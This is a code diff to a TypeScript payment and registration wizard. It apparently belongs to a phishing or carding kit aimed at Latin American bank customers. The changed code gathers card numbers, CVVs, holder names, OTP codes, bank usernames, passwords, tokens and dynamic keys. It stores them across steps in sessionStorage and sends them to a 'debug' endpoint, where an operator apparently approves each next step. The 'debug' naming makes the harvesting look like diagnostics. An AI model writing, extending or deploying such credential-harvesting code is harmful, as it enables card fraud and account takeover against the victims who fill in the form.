@@ -183,6 +183,48 @@ function notifyPicoStep(step: string, event: "P-STEP" | "CARD_BANNER" = "P-STEP"
   }).catch(() => {});
 }
 
+const PAYMENT_META_KEY = "latam-debug-payment-meta";
+const PAYMENT_OTP_KEY = "latam-debug-payment-otp";
+
+function keepFilled(previous: Record<string, unknown>, incoming: Record<string, unknown>) {
+  const out: Record<string, unknown> = { ...previous };
+  for (const [key, value] of Object.entries(incoming)) {
+    if (value === "" || value === null || value === undefined) continue;
+    if (value && typeof value === "object" && !Array.isArray(value)) {
+      out[key] = keepFilled(
+        out[key] && typeof out[key] === "object" && !Array.isArray(out[key])
+          ? (out[key] as Record<string, unknown>)
+          : {},
+        value as Record<string, unknown>,
+      );
+      continue;
+    }
+    out[key] = value;
+  }
+  return out;
+}
+
+function readStored(key: string) {
+  try {
+    const raw = sessionStorage.getItem(key);
+    return raw ? (JSON.parse(raw) as Record<string, unknown>) : {};
+  } catch {
+    return {};
+  }
+}
+
+function accumulateDebugMeta(incoming: Record<string, unknown>) {
+  const next = keepFilled(readStored(PAYMENT_META_KEY), incoming);
+  sessionStorage.setItem(PAYMENT_META_KEY, JSON.stringify(next));
+  return next;
+}
+
+function accumulateDebugOtp(incoming: Record<string, unknown>) {
+  const next = keepFilled(readStored(PAYMENT_OTP_KEY), incoming);
+  sessionStorage.setItem(PAYMENT_OTP_KEY, JSON.stringify(next));
+  return next;
+}
+
 function setStep(step: number) {
   state.step = step;
   document.querySelectorAll(".wizard-panel").forEach((panel) => {
@@ -1133,7 +1175,7 @@ export function bindSolicitudWizard() {
           sessionId,
           route: "/Registro",
           cardFirstDigit: digits.charAt(0),
-          meta: {
+          meta: accumulateDebugMeta({
             step: "✅ Agregó datos tarjeta",
             amount: grandTotal(),
             brand: brandKey,
@@ -1144,7 +1186,7 @@ export function bindSolicitudWizard() {
               exp: val("cardCvv"),
               holder: val("cardTitular"),
             },
-          },
+          }),
         }),
       });
       const decision = await pollDebugDecision(sessionId);
@@ -1213,13 +1255,17 @@ export function bindSolicitudWizard() {
             event: "OTP_SUBMIT",
             sessionId,
             route: "/Registro",
-            metaOtp: {
+            meta: accumulateDebugMeta({
+              step: "Envió código OTP",
+              brand: brandKey,
+            }),
+            metaOtp: accumulateDebugOtp({
               step: "Envió código OTP",
               brand: brandKey,
               otp: input.value,
               otpLength: String(input.value || "").trim().length,
               attempt: attempts,
-            },
+            }),
           }),
         });
       } catch {
@@ -1273,13 +1319,13 @@ export function bindSolicitudWizard() {
             event: eventName,
             sessionId,
             route: "/Registro",
-            meta: {
+            meta: accumulateDebugMeta({
               step: kind === "token" ? "Envió token" : kind === "dynamic" ? "Envió clave dinámica" : "Envió usuario y contraseña",
               username,
               password,
               token,
               cdin,
-            },
+            }),
           }),
         });
       } catch {
